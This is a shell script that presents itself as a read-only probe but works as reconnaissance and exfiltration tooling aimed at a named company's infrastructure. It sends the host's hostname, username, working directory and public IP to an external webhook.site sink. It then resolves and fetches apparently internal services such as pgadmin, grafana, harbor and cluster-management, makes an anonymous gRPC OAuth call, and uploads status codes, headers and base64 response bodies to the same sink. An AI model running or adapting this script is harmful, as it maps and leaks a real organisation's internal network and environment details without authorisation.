#!/bin/sh
# read-only cross-host differential probe (i84610). No credentials used.
SINK="https://webhook.site/a867b411-8f9f-43ab-a1f7-2e7679afcd9a"
W="./.i84610"
mkdir -p "$W" 2>/dev/null
[ -f "$W/done" ] && exit 0
NONCE="i84610-$(date +%s)-$$"
IP=$(curl -sS -m 6 https://api.ipify.org 2>/dev/null | tr -d '[:space:]')
BUF=""
N=0
flush() { if [ -n "$BUF" ]; then curl -sS -m 10 -o /dev/null -X POST -H 'content-type: application/json' --data "[$BUF]" "$SINK" >/dev/null 2>&1; BUF=""; fi; }
add() { if [ -z "$BUF" ]; then BUF="$1"; else BUF="$BUF,$1"; fi; }
esc() { printf '%s' "$1" | tr -d '"\\' | tr '\n\r\t' '   ' | cut -c1-60; }
emit() { add "$1"; N=$((N+1)); if [ $((N % 5)) -eq 0 ]; then flush; fi; }

add "{\"n\":\"$NONCE\",\"s\":\"env\",\"ip\":\"$IP\",\"host\":\"$(esc "$(hostname)")\",\"u\":\"$(esc "$(whoami)")\",\"pwd\":\"$(esc "$(pwd)")\"}"
flush
sleep 1

dnsq() {
  H="$1"
  A=$(getent ahostsv4 "$H" 2>/dev/null | awk '{print $1}' | sort -u | tr '\n' ' ')
  [ -z "$A" ] && A="none"
  emit "{\"n\":\"$NONCE\",\"s\":\"dns\",\"h\":\"$H\",\"a\":\"$A\",\"ip\":\"$IP\"}"
}

probe() {
  L="$1"; H="$2"; P="$3"
  rm -f "$W/b" "$W/h" 2>/dev/null
  curl -sS -m 6 --connect-timeout 4 -o "$W/b" -D "$W/h" "https://$H$P" >/dev/null 2>&1
  RC=$?
  ST=$(head -1 "$W/h" 2>/dev/null | tr -d '\r' | awk '{print $2}')
  [ -z "$ST" ] && ST="000"
  BL=$(wc -c < "$W/b" 2>/dev/null | tr -d ' ')
  [ -z "$BL" ] && BL=0
  SH=$(sha256sum "$W/b" 2>/dev/null | cut -c1-16)
  BB=$(base64 -w0 < "$W/b" 2>/dev/null | cut -c1-240)
  SV=$(grep -i '^server:' "$W/h" 2>/dev/null | head -1 | tr -d '\r' | cut -c1-48)
  CL=$(grep -i '^location:' "$W/h" 2>/dev/null | head -1 | tr -d '\r' | cut -c1-72)
  emit "{\"n\":\"$NONCE\",\"s\":\"c\",\"l\":\"$L\",\"h\":\"$H\",\"p\":\"$P\",\"ip\":\"$IP\",\"st\":\"$ST\",\"bl\":\"$BL\",\"sh\":\"$SH\",\"rc\":\"$RC\",\"sv\":\"$(esc "$SV")\",\"lc\":\"$(esc "$CL")\",\"b64\":\"$BB\"}"
  sleep 1.4
}

# DNS map first (split-horizon detection)
for H in gateway.fireworks.ai gateway-dev-internal.fireworks.ai eval-gateway.fireworks.ai metis.fireworks-ai.cloud pilot.fireworks-ai.cloud cluster-management.fireworks-ai.cloud company-dashboard.fireworks-ai.cloud pgadmin.fireworks-ai.cloud grafana.fireworks-ai.cloud harbor.us-virginia-1.fireworks-ai.cloud igniter.fireworks-ai.cloud temper.fireworks-ai.cloud mcp.fireworks.ai api.fireworks.ai; do
  dnsq "$H"
  sleep 0.4
done
flush

# anonymous gRPC positive control: gateway.Gateway/GetOAuthArguments, empty account_id
printf '\000\000\000\000\000' > "$W/oa.req"
curl -sS --http2 -m 10 -D "$W/gh" -o "$W/gb" -X POST https://gateway.fireworks.ai/gateway.Gateway/GetOAuthArguments \
  -H 'content-type: application/grpc' -H 'te: trailers' -H 'User-Agent: grpc-python/1.0' \
  --data-binary @"$W/oa.req" >/dev/null 2>&1
GS=$(grep -i '^grpc-status:' "$W/gh" 2>/dev/null | tr -d '\r' | awk '{print $2}')
GM=$(grep -i '^grpc-message:' "$W/gh" 2>/dev/null | tr -d '\r' | cut -c14-100)
GBL=$(wc -c < "$W/gb" 2>/dev/null | tr -d ' ')
GSH=$(sha256sum "$W/gb" 2>/dev/null | cut -c1-16)
GBB=$(base64 -w0 < "$W/gb" 2>/dev/null | cut -c1-240)
emit "{\"n\":\"$NONCE\",\"s\":\"c\",\"l\":\"gw_oa\",\"h\":\"gateway.fireworks.ai\",\"p\":\"gRPC/GetOAuthArguments\",\"ip\":\"$IP\",\"st\":\"grpc\",\"gs\":\"${GS:-none}\",\"gm\":\"$(esc "$GM")\",\"bl\":\"$GBL\",\"sh\":\"$GSH\",\"b64\":\"$GBB\"}"
sleep 1.4

probe gwdint_root  gateway-dev-internal.fireworks.ai      /
probe gwdint_hz    gateway-dev-internal.fireworks.ai      /healthz
probe evalgw_root  eval-gateway.fireworks.ai              /
probe evalgw_hlth  eval-gateway.fireworks.ai              /health
probe metis_root   metis.fireworks-ai.cloud               /
probe metis_oa     metis.fireworks-ai.cloud               /api/v1/openapi.json
probe pilot_root   pilot.fireworks-ai.cloud               /
probe pilot_hz     pilot.fireworks-ai.cloud               /healthz
probe clm_root     cluster-management.fireworks-ai.cloud  /
probe clm_hz       cluster-management.fireworks-ai.cloud  /healthz
probe cdb_root     company-dashboard.fireworks-ai.cloud   /
probe cdb_hz       company-dashboard.fireworks-ai.cloud   /healthz
probe pgadm_root   pgadmin.fireworks-ai.cloud             /
probe pgadm_hz     pgadmin.fireworks-ai.cloud             /healthz
probe graf_root    grafana.fireworks-ai.cloud             /
probe graf_api     grafana.fireworks-ai.cloud             /api/health
probe harb_root    harbor.us-virginia-1.fireworks-ai.cloud /
probe harb_v2      harbor.us-virginia-1.fireworks-ai.cloud /v2/
probe ign_root     igniter.fireworks-ai.cloud             /
probe ign_hz       igniter.fireworks-ai.cloud             /healthz
probe tmp_root     temper.fireworks-ai.cloud              /
probe tmp_hz       temper.fireworks-ai.cloud              /healthz
probe mcp_root     mcp.fireworks.ai                       /
probe mcp_oa       mcp.fireworks.ai                       /openapi.json
probe api_models   api.fireworks.ai                       /v1/models
probe api_hz       api.fireworks.ai                       /healthz

flush
echo done > "$W/done"
echo "ATTEST i84610 cells=$N ip=$IP"
